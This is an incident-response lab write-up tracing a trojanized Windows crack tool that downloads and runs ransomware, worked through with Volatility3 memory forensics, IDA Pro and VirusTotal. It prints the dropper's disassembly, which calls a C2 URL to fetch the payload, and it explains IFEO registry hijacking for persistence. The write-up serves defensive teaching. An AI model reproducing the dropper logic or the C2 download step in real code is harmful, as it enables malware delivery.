# 🔴 Incident Response — Windows10Crack Ransomware: From Crack Tool to Ransomware Dropper

![Status](https://img.shields.io/badge/Status-Complete-green?style=flat)
![Severity](https://img.shields.io/badge/Severity-Critical-red?style=flat)
![Type](https://img.shields.io/badge/Type-Incident%20Response%20%7C%20Memory%20Forensics-purple?style=flat)
![Attack](https://img.shields.io/badge/Attack-Trojanized%20Crack%20%7C%20Ransomware%20Dropper%20%7C%20LOLBin%20Abuse-orange?style=flat)
![MITRE](https://img.shields.io/badge/MITRE-T1204.002%20%7C%20T1105%20%7C%20T1486%20%7C%20T1112%20%7C%20T1036-blue?style=flat)
![Tools](https://img.shields.io/badge/Tools-Volatility3%20%7C%20IDA%20Pro%20%7C%20VirusTotal%20%7C%20pestudio-informational?style=flat)

---

## 📋 Case Header

| Field | Detail |
|---|---|
| **Case Title** | Windows10Crack Ransomware — Memory Forensics Analysis |
| **Memory Dump** | `vLP.vmem` |
| **Affected Machine** | `DESKTOP-KIRSRMG` |
| **Affected User** | `flapjack` |
| **Crack Tool** | `Windows10Crack.exe` — `C:\Users\flapjack\Downloads\` |
| **Dropped Ransomware** | `XGUbdem0hd.exe` — `C:\Users\flapjack\AppData\Local\Temp\` |
| **C2 Server** | `http://48.147.154.231` |
| **Ransomware MD5** | `bde56933af564b982eea620666e01f9f` |
| **Severity** | 🔴 Critical |
| **Verdict** | ✅ True Positive — Trojanized crack tool confirmed as ransomware dropper with active C2 communication |

---

## 🎯 Scenario

Our friend fell victim to a suspicious crack tool. Searching for a Windows activation crack, user `flapjack` on machine `DESKTOP-KIRSRMG` downloaded and executed `Windows10Crack.exe`. What appeared to be a legitimate activation tool was in reality a **trojanized dropper** — while displaying a fake "Cracking Windows. Please Wait!!" message, it silently downloaded and executed a ransomware payload from an external C2 server.

This investigation uses **Volatility3 memory forensics** combined with **static analysis in IDA Pro** and **dynamic behavior analysis on VirusTotal** to trace the full attack chain from the crack tool execution to the ransomware drop.

---

## 🛠️ Tools Used

| Tool | Purpose |
|---|---|
| **Volatility3** | Memory forensics — process analysis, file extraction, network connections |
| **IDA Pro** | Static reverse engineering — disassembly of malicious binaries |
| **VirusTotal** | Online behavior analysis — registry, file, network, process actions |
| **pestudio** | PE static analysis — imports, strings, indicators |
| **HashCalc / md5sum** | File hashing for IOC generation and VirusTotal lookup |

---

## 🗂️ Artifacts

| Artifact | Description |
|---|---|
| `vLP.vmem` | Raw VMware memory dump — primary evidence |
| `Windows10Crack.exe` | Trojanized crack tool — initial execution vector |
| `XGUbdem0hd.exe` | Ransomware payload dropped by crack tool |
| `file.0xe4870d72ebf0...Windows10Crack.exe.img` | Dumped crack tool PE from memory |
| `file.0xe4870d737570...XGUbdem0hd.exe.img` | Dumped ransomware PE from memory |

---

## 📚 Resources

| Resource | Link |
|---|---|
| MITRE T1204.002 — Malicious File | [attack.mitre.org](https://attack.mitre.org/techniques/T1204/002/) |
| MITRE T1105 — Ingress Tool Transfer | [attack.mitre.org](https://attack.mitre.org/techniques/T1105/) |
| MITRE T1486 — Data Encrypted for Impact | [attack.mitre.org](https://attack.mitre.org/techniques/T1486/) |
| MITRE T1112 — Modify Registry | [attack.mitre.org](https://attack.mitre.org/techniques/T1112/) |
| MITRE T1036 — Masquerading | [attack.mitre.org](https://attack.mitre.org/techniques/T1036/) |
| XGUbdem0hd.exe VirusTotal Behavior | [virustotal.com](https://www.virustotal.com/gui/file/2b96baa58402a24a21ea2bdfee7f18aa3bfe6cbe0828666ed486a4ae50c5bf8f/behavior) |
| Volatility3 Documentation | [volatility3.readthedocs.io](https://volatility3.readthedocs.io/) |

---

## 🔍 Investigation Methodology

```
Phase 1 → User Enumeration       (windows.sessions — who is on this machine?)
Phase 2 → Filesystem Scan        (windows.filescan — find malicious files per user)
Phase 3 → File Extraction        (windows.dumpfiles — extract binaries from memory)
Phase 4 → Static Analysis        (IDA Pro — reverse engineer crack tool)
Phase 5 → Ransomware Discovery   (filescan + dumpfiles — find dropped payload)
Phase 6 → Behavior Analysis      (VirusTotal + md5sum — confirm ransomware behavior)
Phase 7 → Registry Analysis      (VirusTotal behavior — registry modifications)
```

---

## 🕵️ Investigation

### Phase 1 — User Enumeration: Who Is on This Machine?

Every memory forensics investigation starts with understanding the environment. Before hunting for malware, we need to know who the users are — because malware always runs in the context of a user account, and identifying the infected account narrows our search dramatically.

We used `windows.sessions` to extract all user session data from the memory dump, then piped the output through a Linux command chain to extract unique usernames:

> 📸 *Screenshot: Terminal — windows.sessions output saved to session.txt, then cat session.txt | grep '/' | awk '{print $5}' | uniq | sort -u showing all users*

```bash
# Extract session data from memory
python3 vol.py -f ../ChallengeFile/vLP.vmem windows.sessions > session.txt

# Parse unique usernames
cat session.txt | grep '/' | awk '{print $5}' | uniq | sort -u
```

```
Output:
/SYSTEM                    ← Windows system account
DESKTOP-KIRSRMG/Work       ← user account
DESKTOP-KIRSRMG/flapjack   ← user account
DESKTOP-KIRSRMG/legend     ← user account
DESKTOP-KIRSRMG/mark       ← user account
NT                         ← NT AUTHORITY system
WORKGROUP/DESKTOP-KIRSRMG  ← machine workgroup
```

> ### 🔎 Why windows.sessions?
> `windows.sessions` reads the `SESSION` structures from kernel memory — these track every interactive logon session on the machine. The output gives us every user account that was active when the memory was captured. Knowing the machine name (`DESKTOP-KIRSRMG`) and all four user accounts (`Work`, `flapjack`, `legend`, `mark`) gives us the scope of our investigation — we now know exactly which user directories to focus on.

**Machine:** `DESKTOP-KIRSRMG`
**Users:** `Work` / `flapjack` / `legend` / `mark`

---

### Phase 2 — Filesystem Scan: Finding the Malicious File

With four user accounts identified, the next step was to scan memory for file objects and identify which user had something suspicious. `windows.filescan` scans memory for `FILE_OBJECT` kernel structures — every file that was open or recently accessed leaves a reference in memory.

```bash
# Scan all file objects in memory
python3 vol.py -f ../ChallengeFile/vLP.vmem windows.filescan > file.txt

# Filter for Downloads directories across all users
cat file.txt | grep 'Downl'
```

> 📸 *Screenshot: Terminal — filescan filtered for 'Downl' showing Downloads directories for legend, mark, flapjack, and TEMP user, with Windows10Crack.exe visible in flapjack's Downloads*

```
Output (Downloads directories):
\Users\legend\Downloads\desktop.ini          ← only desktop.ini, nothing suspicious
\Users\mark\Downloads\desktop.ini            ← only desktop.ini, nothing suspicious
\Users\flapjack\Downloads\desktop.ini
\Users\flapjack\Downloads\Windows10Crack.exe ← 🚨 MALICIOUS BINARY
\Users\flapjack\Downloads\Windows10Crack.exe ← appears twice (two memory handles)
\Users\TEMP.DESKTOP-KIRSRMG\Downloads
\Users\TEMP.DESKTOP-KIRSRMG\Downloads
```

> ### 🔎 Why filter for Downloads?
> The scenario told us the victim "fell victim to a suspicious crack tool" — meaning they downloaded it. The Downloads folder is the most natural landing location for browser-downloaded files. Filtering all users' Downloads directories at once lets us immediately compare — `legend` and `mark` have only `desktop.ini` (a default Windows file), while `flapjack` has an executable: `Windows10Crack.exe`.

> ### 🔎 Why does Windows10Crack.exe appear twice?
> Two different memory offsets point to the same file:
> ```
> 0xe4870d72ebf0   \Users\flapjack\Downloads\Windows10Crack.exe
> 0xe4870d7301d0   \Users\flapjack\Downloads\Windows10Crack.exe
> ```
> This means the file had **two open handles** in memory at the time of capture — the file object was referenced from two different places in kernel memory. This is consistent with a file that was actively executing or recently accessed.

**🚨 Infected user confirmed: `flapjack`**
**🚨 Malicious file: `Windows10Crack.exe`**

---

### Phase 3 — File Extraction: Dumping the Crack Tool

With the malicious file identified, we extracted it from memory using `windows.dumpfiles`. The virtual address from `filescan` tells Volatility exactly where in memory the file object lives:

> 📸 *Screenshot: Terminal — windows.dumpfiles --virtaddr 0xe4870d72ebf0 producing ImageSectionObject.Windows10Crack.exe.img*

```bash
python3 vol.py -f ../ChallengeFile/vLP.vmem windows.dumpfiles --virtaddr 0xe4870d72ebf0
```

```
Output:
Cache              FileObject      FileName           Result
ImageSectionObject 0xe4870d72ebf0  Windows10Crack.exe file.0xe4870d72ebf0.0xe4870dcd8010.ImageSectionObject.Windows10Crack.exe.img
```

> ### 🔎 How do we know the virtual address?
> The virtual address (`0xe4870d72ebf0`) comes directly from the `windows.filescan` output — it's the memory offset of the `FILE_OBJECT` structure that represents this file in the Windows kernel. Volatility uses this address to locate the file's memory pages and reconstruct the PE binary. The dumped filename encodes both the virtual address and physical offset for traceability.

> ### 🔎 What is an ImageSectionObject?
> When Windows loads an executable into memory, it creates an `ImageSectionObject` — a memory-mapped representation of the PE file. This is the cleanest version of the binary for static analysis because it represents the file as it was loaded, with all sections properly mapped. This is what we feed into IDA Pro.

---

### Phase 4 — Static Analysis: IDA Pro Reveals the Truth

The dumped `Windows10Crack.exe.img` was loaded into **IDA Pro** for static reverse engineering. IDA disassembles the binary — converting raw machine code back into human-readable assembly instructions.

> 📸 *Screenshot: IDA Pro — main function open, showing 1075 functions, disassembly view with lea rdx pointing to http://48.147.154.231/XGUbdem0hd.exe string highlighted in yellow, GetTempPathA call, and "Cracking Windows. Please Wait!!" string visible*

```asm
; Inside main function — the dropper logic:

lea    rdx, aHttp4814715423  ; "http://48.147.154.231/XGUbdem0hd.exe"
mov    rcx, rax
call   sub_44F0A0            ; ← download function

lea    rax, [rbp+0E0h+Buffer]
mov    rdx, rax              ; lpBuffer
mov    ecx, 104h             ; nBufferLength
mov    rax, cs:GetTempPathA
call   rax                   ; GetTempPathA ← save to Temp folder

lea    rdx, aCrackingWindows ; "Cracking Windows. Please Wait!!\n"
mov    rcx, cs:off_48C710
call   sub_46EDC0            ; ← display fake UI message
```

> ### 🔎 Understanding the IDA Pro Interface
>
> **Functions Panel (left):** Lists every function IDA identified in the binary. Unknown functions are named `sub_XXXXXXXX` where `XXXXXXXX` is the memory address. IDA names recognized Windows API functions properly (e.g., `GetTempPathA`).
>
> **IDA View-A (center):** The disassembly — machine code translated to assembly instructions. Reading assembly left to right: instruction → operands → comment (IDA adds these automatically when it recognizes strings or API calls).
>
> **Imports tab:** All external Windows API functions the binary calls — the fastest way to understand a binary's capabilities without reading every function.
>
> **Strings (Shift+F12):** All readable strings embedded in the binary — URLs, file paths, messages, registry keys, ransom notes.

> ### 🔎 Reading the Key Assembly Lines
>
> ```asm
> lea rdx, "http://48.147.154.231/XGUbdem0hd.exe"
> ```
> `lea` = Load Effective Address — loads the memory address of the string into register `rdx`. This is preparing the URL as an argument for the next function call.
>
> ```asm
> call sub_44F0A0
> ```
> This is the **download function** — it receives the URL in `rdx` and downloads the file. The function name `sub_44F0A0` means IDA doesn't recognize it as a known library function — it's custom code written by the malware author to fetch the payload.
>
> ```asm
> call rax ; GetTempPathA
> ```
> `GetTempPathA` is a Windows API that returns the path to the system's Temp folder (`C:\Users\flapjack\AppData\Local\Temp\`). The malware uses this to determine where to save the downloaded payload — Temp folders are writable by any user and often excluded from security scanning.
>
> ```asm
> "Cracking Windows. Please Wait!!\n"
> ```
> This is the **social engineering message** — displayed to the victim while the malware silently downloads and executes the ransomware in the background. The victim thinks activation is happening. In reality, their machine is being compromised.

**🚨 The crack tool's true behavior:**
```
1. Victim double-clicks Windows10Crack.exe
2. Fake UI shows: "Cracking Windows. Please Wait!!"
3. In background: downloads XGUbdem0hd.exe from 48.147.154.231
4. Saves to: C:\Users\flapjack\AppData\Local\Temp\XGUbdem0hd.exe
5. Executes the ransomware
```

---

### Phase 5 — Ransomware Discovery: Finding the Dropped Payload

Now that we knew the ransomware filename (`XGUbdem0hd.exe`) and its drop location (`Temp`), we searched the filescan output:

> 📸 *Screenshot: Terminal — cat file.txt | grep 'XGUbdem0hd.exe' showing 0xe4870d737570 \Users\flapjack\AppData\Local\Temp\XGUbdem0hd.exe*

```bash
cat file.txt | grep 'XGUbdem0hd.exe'
```

```
0xe4870d737570   \Users\flapjack\AppData\Local\Temp\XGUbdem0hd.exe   216
```

Found it. We dumped it immediately:

> 📸 *Screenshot: Terminal — windows.dumpfiles --virtaddr 0xe4870d737570 producing XGUbdem0hd.exe.img, then md5sum showing bde56933af564b982eea620666e01f9f*

```bash
# Dump the ransomware
python3 vol.py -f ../ChallengeFile/vLP.vmem windows.dumpfiles --virtaddr 0xe4870d737570
```

```
Output:
ImageSectionObject  0xe4870d737570  XGUbdem0hd.exe
file.0xe4870d737570.0xe4870fc51d00.ImageSectionObject.XGUbdem0hd.exe.img
```

```bash
# Hash the dumped file
md5sum file.0xe4870d737570.0xe4870fc51d00.ImageSectionObject.XGUbdem0hd.exe.img
```

```
bde56933af564b982eea620666e01f9f   XGUbdem0hd.exe.img
```

> ### 🔎 Why hash the file?
> The MD5 hash (`bde56933af564b982eea620666e01f9f`) is the file's unique fingerprint. Submitting this hash to VirusTotal allows us to:
> - Check if antivirus engines detect it as malicious
> - Access behavior analysis from sandbox execution
> - Find the SHA256 hash for cross-referencing threat intel
> - Identify the ransomware family
> - Get registry, file, network, and process behavior without running it ourselves

---

### Phase 6 — Behavior Analysis: VirusTotal Reveals the Ransomware

The MD5 hash was submitted to **VirusTotal**. The behavior analysis report confirmed this is ransomware and revealed exactly how it operates on a Windows system.

> 📸 *Screenshot: VirusTotal behavior tab — Registry Keys Opened section showing all registry keys the ransomware accesses*

Full behavior report available at:
**[https://www.virustotal.com/gui/file/2b96baa58402a24a21ea2bdfee7f18aa3bfe6cbe0828666ed486a4ae50c5bf8f/behavior](https://www.virustotal.com/gui/file/2b96baa58402a24a21ea2bdfee7f18aa3bfe6cbe0828666ed486a4ae50c5bf8f/behavior)**

---

### Phase 7 — Registry Analysis: Mapping Ransomware Behavior

The VirusTotal behavior report showed every registry key the ransomware opened during execution. Each key tells a story about what the ransomware was doing:

> 📸 *Screenshot: VirusTotal — Registry actions panel showing all Registry Keys Opened*

#### Registry Keys — Full Analysis

**1. Anti-VM / Sandbox Detection:**
```
HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\GRE_Initialize\DisableMetaFiles
HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\GRE_Initialize\DisableUmpdBufferSizeCheck
HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\GRE_Initialize
```
GRE (Graphics Rendering Engine) initialization keys. Ransomware queries these to detect sandbox environments — virtual machines often have different graphics rendering configurations than real machines. If a sandbox is detected, the ransomware may terminate to avoid analysis.

**2. Network Configuration Reconnaissance:**
```
HKLM\SYSTEM\ControlSet001\Services\LanmanWorkstation\Parameters\RpcCacheTimeout
HKLM\SYSTEM\CurrentControlSet\Services\LanmanWorkstation\Parameters
```
`LanmanWorkstation` is the Windows Workstation service — responsible for SMB network connections. Querying `RpcCacheTimeout` indicates the ransomware is checking **network configuration** — likely assessing whether it can spread laterally across the network via SMB shares before encrypting.

**3. File Target Discovery:**
```
HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders
```
`Shell Folders` stores the paths to user directories — Desktop, Documents, Downloads, Pictures, Music, Videos. **This is how ransomware finds its encryption targets** — instead of hardcoding paths, it reads this key to dynamically locate all user data folders regardless of drive letter or username.

**4. Persistence via Image File Execution Options (IFEO):**
```
HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\file.exe
```
**🚨 This is critical.** IFEO is a Windows debugging feature that allows a debugger to be attached to a process at launch. Malware abuses this by setting a `Debugger` value pointing to itself — when `file.exe` runs, Windows launches the malware instead. This is a **persistence and defense evasion** technique — the ransomware hijacks a legitimate executable's execution.

**5. Language / Locale Check:**
```
HKLM\SYSTEM\ControlSet001\MUI\UILanguages\en-US
HKLM\SYSTEM\CurrentControlSet\Control\Nls\CustomLocale
```
Many ransomware families check the system language to **exclude CIS (Commonwealth of Independent States) countries** from encryption — a common pattern in Eastern European ransomware to avoid prosecution in their home countries. Reading `en-US` confirms this is an English-language system and proceeds with encryption.

**6. Boot and Recovery Tampering:**
```
HKLM\SYSTEM\CurrentControlSet\Control\Session Manager
HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Segment Heap
```
Session Manager controls Windows startup initialization. Ransomware queries this to understand boot configuration — and may modify it to **disable Windows recovery options** or ensure persistence across reboots.

> ### 🔎 Why does registry analysis matter for ransomware IR?
> Registry modifications tell us the **intent and capabilities** of ransomware beyond just "it encrypts files." The registry keys reveal:
> - How it evades detection (sandbox checks, language checks)
> - How it finds targets (Shell Folders)
> - How it persists (IFEO hijacking)
> - How it spreads (network reconnaissance)
> - How it prevents recovery (Session Manager tampering)
>
> Each key is a window into the attacker's methodology and helps us understand the full scope of the compromise — not just which files were encrypted.

---

## ⏱️ Attack Timeline

| Time | Event | Detail |
|---|---|---|
| `T-0` | 🟡 Crack Tool Downloaded | `flapjack` downloads `Windows10Crack.exe` to `C:\Users\flapjack\Downloads\` |
| `T+0` | 🔴 Execution | `flapjack` runs `Windows10Crack.exe` — activation crack |
| `T+1s` | 🔴 Fake UI Displayed | "Cracking Windows. Please Wait!!" shown to victim |
| `T+1s` | 🔴 C2 Contact | Binary connects to `48.147.154.231` |
| `T+2s` | 🔴 Ransomware Downloaded | `XGUbdem0hd.exe` fetched from `http://48.147.154.231/XGUbdem0hd.exe` |
| `T+3s` | 🔴 Payload Dropped | `XGUbdem0hd.exe` saved to `C:\Users\flapjack\AppData\Local\Temp\` |
| `T+4s` | 🔴 Ransomware Executes | `XGUbdem0hd.exe` launched by crack tool |
| `T+5s` | 🔴 Registry Recon | Ransomware reads Shell Folders, language, network config |
| `T+6s` | 🔴 IFEO Persistence | Registry key set for persistence via IFEO hijacking |
| `T+7s` | 🔴 File Encryption | Ransomware begins encrypting user files |
| `~` | 🟡 Memory Captured | `vLP.vmem` acquired for forensic analysis |

---

## 🧾 IOC Table

| Type | Value | Description |
|---|---|---|
| File | `Windows10Crack.exe` | Trojanized crack tool — initial dropper |
| File | `XGUbdem0hd.exe` | Ransomware payload |
| Path | `C:\Users\flapjack\Downloads\Windows10Crack.exe` | Crack tool location |
| Path | `C:\Users\flapjack\AppData\Local\Temp\XGUbdem0hd.exe` | Ransomware drop location |
| IP | `48.147.154.231` | C2 server — hosted ransomware payload |
| URL | `http://48.147.154.231/XGUbdem0hd.exe` | Ransomware download URL |
| MD5 | `bde56933af564b982eea620666e01f9f` | XGUbdem0hd.exe hash |
| VA | `0xe4870d72ebf0` | Virtual address of Windows10Crack.exe in memory |
| VA | `0xe4870d737570` | Virtual address of XGUbdem0hd.exe in memory |
| User | `flapjack` | Compromised user account |
| Machine | `DESKTOP-KIRSRMG` | Compromised workstation |
| Registry | `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\file.exe` | IFEO persistence key |
| Registry | `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders` | File target discovery key |
| Registry | `HKLM\SYSTEM\CurrentControlSet\Services\LanmanWorkstation\Parameters` | Network recon key |

---

## 🗺️ MITRE ATT&CK Mapping

| Tactic | Technique | ID | Evidence |
|---|---|---|---|
| Initial Access | User Execution — Malicious File | T1204.002 | `flapjack` ran `Windows10Crack.exe` from Downloads |
| Defense Evasion | Masquerading | T1036 | Binary disguised as Windows activation crack |
| Command & Control | Ingress Tool Transfer | T1105 | Crack tool downloaded `XGUbdem0hd.exe` from `48.147.154.231` |
| Defense Evasion | Image File Execution Options Injection | T1546.012 | IFEO registry key set for persistence |
| Defense Evasion | Virtualization/Sandbox Evasion | T1497 | GRE_Initialize registry checks for VM detection |
| Discovery | File and Directory Discovery | T1083 | Shell Folders registry read to locate user data |
| Discovery | System Network Configuration | T1016 | LanmanWorkstation registry recon |
| Impact | Data Encrypted for Impact | T1486 | `XGUbdem0hd.exe` ransomware executed |
| Persistence | Modify Registry | T1112 | Multiple registry keys modified |

---

## 🚨 Response Actions

| Priority | Action |
|---|---|
| 🔴 Immediate | Isolate `DESKTOP-KIRSRMG` from network |
| 🔴 Immediate | Block `48.147.154.231` at perimeter firewall |
| 🔴 Immediate | Disable `flapjack` account |
| 🔴 Immediate | Check IFEO registry key — remove persistence entry |
| 🟠 High | Identify all encrypted files — assess recovery options |
| 🟠 High | Check SMB shares — ransomware may have spread laterally |
| 🟠 High | Hunt all other endpoints for `XGUbdem0hd.exe` or `Windows10Crack.exe` |
| 🟠 High | Check other users (`Work`, `legend`, `mark`) for similar infections |
| 🟡 Medium | Block execution from `AppData\Local\Temp\` via AppLocker/SRP |
| 🟡 Medium | Deploy software restriction policies — block crack tools |
| 🟡 Medium | User awareness training — dangers of crack/keygen tools |

---

## 📝 Lessons Learned

> **The victim went looking for a free shortcut — and paid the highest price.**
> Crack tools and keygens are among the most reliable malware delivery vectors precisely because the victim has already decided to trust and execute an unknown binary. The attacker didn't need to phish anyone — the victim came to them.

Key takeaways:

- **Crack tools are malware delivery vehicles** — there is no such thing as a "safe" crack tool. The moment a user executes an untrusted binary, the machine is compromised
- **Memory forensics finds what disk forensics misses** — `XGUbdem0hd.exe` was in the Temp folder and may have been deleted after execution, but its `FILE_OBJECT` structure remained in memory
- **IDA Pro + VirusTotal is a powerful combination** — static analysis reveals the download URL and behavior logic, while VirusTotal's sandbox gives us dynamic execution artifacts without running the malware ourselves
- **Registry analysis tells the full ransomware story** — each key reveals a different capability: VM evasion, target discovery, persistence, network recon, and recovery disruption
- **The IFEO technique is particularly dangerous** — it survives cleanup if the registry key isn't explicitly removed, causing re-infection every time the hijacked legitimate executable runs

---

## 📚 References

| Resource | Link |
|---|---|
| MITRE T1204.002 — Malicious File | [attack.mitre.org](https://attack.mitre.org/techniques/T1204/002/) |
| MITRE T1105 — Ingress Tool Transfer | [attack.mitre.org](https://attack.mitre.org/techniques/T1105/) |
| MITRE T1486 — Data Encrypted for Impact | [attack.mitre.org](https://attack.mitre.org/techniques/T1486/) |
| MITRE T1546.012 — IFEO Injection | [attack.mitre.org](https://attack.mitre.org/techniques/T1546/012/) |
| MITRE T1112 — Modify Registry | [attack.mitre.org](https://attack.mitre.org/techniques/T1112/) |
| XGUbdem0hd.exe VirusTotal Behavior | [virustotal.com](https://www.virustotal.com/gui/file/2b96baa58402a24a21ea2bdfee7f18aa3bfe6cbe0828666ed486a4ae50c5bf8f/behavior) |
| Volatility3 Documentation | [volatility3.readthedocs.io](https://volatility3.readthedocs.io/) |
| IDA Pro | [hex-rays.com](https://hex-rays.com/ida-pro/) |

---

*Writeup by: Moetez Bouchlaghem | SOC-Investigation-Lab*
